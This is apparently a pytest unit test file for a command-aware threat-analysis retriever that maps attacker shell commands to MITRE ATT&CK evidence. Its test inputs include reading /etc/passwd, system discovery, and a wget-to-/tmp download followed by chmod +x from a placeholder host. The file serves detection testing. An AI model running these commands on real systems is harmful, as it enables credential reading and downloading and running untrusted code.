from __future__ import annotations

import json
from pathlib import Path

import pytest

from ragin.decision_fusion_v4.evidence_export import build_evidence_bundle
from ragin.decision_fusion_v4.benchmark import EvidenceQualityGate
from ragin.cycle.adapters import DonAdapter
from ragin.don.command_aware_v2 import CommandAwareRetrieverV2, VERSION, analyze_command_sequence
from ragin.don.models import AnalysisRequest, ClassificationLabel
from ragin.don.rag_engine import ThreatRAGEngine

pytestmark = pytest.mark.unit


def test_command_analyzer_is_static_and_preserves_ambiguity() -> None:
    features = analyze_command_sequence(["uname -a | grep Linux", "unterminated '"])
    assert set(features["executables"]) == {"grep", "uname", "unterminated"}
    assert "|" in features["operators"]
    assert features["ambiguity"] == "insufficient_context"
    assert features["behavior_indicators"] == ["environment_discovery"]


def test_retrieval_is_command_specific() -> None:
    retriever = CommandAwareRetrieverV2()
    discovery = retriever.retrieve("uname -a", session_id="a", classification="suspicious")
    credentials = retriever.retrieve("cat /etc/passwd", session_id="a", classification="suspicious")
    assert discovery["trace"]["relevant_evidence_ids"] != credentials["trace"]["relevant_evidence_ids"]
    assert "DONV2-T1082" in discovery["trace"]["relevant_evidence_ids"]
    assert "DONV2-T1552.001" in credentials["trace"]["relevant_evidence_ids"]


def test_full_preceding_context_is_traced() -> None:
    retriever = CommandAwareRetrieverV2()
    result = retriever.retrieve("chmod +x /tmp/x", ["wget http://example.invalid/x -O /tmp/x"], session_id="s")
    projection = result["trace"]["context_projection"]
    assert projection["preceding_commands"] == ["wget http://example.invalid/x -O /tmp/x"]
    assert projection["context_truncated"] is False
    assert result["trace"]["query"].endswith("chmod +x /tmp/x")
    assert result["trace"]["relevant_evidence_ids"]


def test_cache_key_isolated_by_session_and_context() -> None:
    retriever = CommandAwareRetrieverV2()
    first = retriever.retrieve("uname -a", session_id="one")
    second = retriever.retrieve("uname -a", session_id="two")
    third = retriever.retrieve("uname -a", session_id="one")
    assert first["trace"]["cache_hit"] is False
    assert second["trace"]["cache_hit"] is False
    assert third["trace"]["cache_hit"] is True
    assert first["trace"]["cache_key"] != second["trace"]["cache_key"]


def test_irrelevant_input_returns_no_relevant_evidence() -> None:
    result = CommandAwareRetrieverV2().retrieve("echo harmless", session_id="s", classification="benign")
    assert result["documents"] == []
    assert result["trace"]["query_coverage"]["complete"] is False


def test_runtime_mode_is_opt_in_and_exports_trace(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("RAGIN_RAG_MODE", "offline")
    monkeypatch.setenv("RAGIN_DON_RETRIEVAL_VERSION", VERSION)
    engine = ThreatRAGEngine(corpus_path="data/corpus/mitre_attack.jsonl")
    request = AnalysisRequest(
        session_id="syntheticv2",
        classification=ClassificationLabel.SUSPICIOUS,
        confidence=0.5,
        features={"attacker_input": "uname -a"},
    )
    analysis = engine.analyze(request, [{"role": "attacker", "content": "uname -a"}])
    bundle = build_evidence_bundle(analysis, {"session_id": "syntheticv2", "classification": {}}, "uname -a")
    retrieval = bundle["retrieval"]
    assert retrieval["backend"] == "command_aware_v2"
    assert retrieval["implementation_version"] == VERSION
    assert retrieval["trace_summary"]["top_k"]
    assert retrieval["trace_summary"]["context_projection"]["features"]["executables"] == ["uname"]
    assert bundle["evidence_gate_preview"]["reason_code"] == "validated_bundle"
    json.dumps(bundle)


def test_historical_runtime_mode_remains_default(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.delenv("RAGIN_DON_RETRIEVAL_VERSION", raising=False)
    monkeypatch.setenv("RAGIN_RAG_MODE", "offline")
    engine = ThreatRAGEngine(corpus_path="data/corpus/mitre_attack.jsonl")
    request = AnalysisRequest(session_id="legacyv2", classification=ClassificationLabel.BENIGN, confidence=0.5)
    analysis = engine.analyze(request, [{"role": "attacker", "content": "echo harmless"}])
    assert "command_aware_v2" not in analysis.raw_features


def test_frozen_development_matrix_uses_independent_oracles() -> None:
    cases = json.loads(Path("tests/fixtures/don_v2_development_cases.json").read_text())
    retriever = CommandAwareRetrieverV2()
    for case in cases:
        result = retriever.retrieve(case["commands"][-1], case["commands"][:-1], session_id=case["case_id"])
        features = result["trace"]["context_projection"]["features"]
        if case["oracle"] == "no_security_behavior_required":
            assert result["documents"] == []
        elif case["oracle"] == "insufficient_context":
            assert features["ambiguity"] == "insufficient_context"
        elif case["oracle"] == "irrelevant_rejected":
            assert result["documents"] == []
        elif case["oracle"] == "download_and_execution_context":
            assert features["download_execution_relationship"] is True
            assert result["documents"]
        else:
            assert result["documents"]


def test_actual_don_adapter_exports_gate_compatible_trace(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("RAGIN_RAG_MODE", "offline")
    monkeypatch.setenv("RAGIN_DON_RETRIEVAL_VERSION", VERSION)
    engine = ThreatRAGEngine(corpus_path="data/corpus/mitre_attack.jsonl")
    adapter = DonAdapter(engine=engine)
    payload = adapter.analyze(
        "cat /etc/passwd",
        {"session_id": "adapterv2", "classification": {"skill_level": "intermediate", "confidence": 0.8}},
    )
    bundle = payload["evidence_bundle"]
    gate = EvidenceQualityGate().evaluate(bundle)
    assert bundle["retrieval"]["backend"] == "command_aware_v2"
    assert bundle["retrieval"]["trace_summary"]["top_k"]
    assert gate["gate_state"] == "VALID_EVIDENCE"


def test_actual_don_adapter_rejects_irrelevant_evidence(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("RAGIN_RAG_MODE", "offline")
    monkeypatch.setenv("RAGIN_DON_RETRIEVAL_VERSION", VERSION)
    engine = ThreatRAGEngine(corpus_path="data/corpus/mitre_attack.jsonl")
    adapter = DonAdapter(engine=engine)
    payload = adapter.analyze(
        "echo harmless",
        {"session_id": "adapterv2b", "classification": {"skill_level": "novice", "confidence": 0.8}},
    )
    gate = EvidenceQualityGate().evaluate(payload["evidence_bundle"])
    assert gate["gate_state"] == "NO_EVIDENCE"
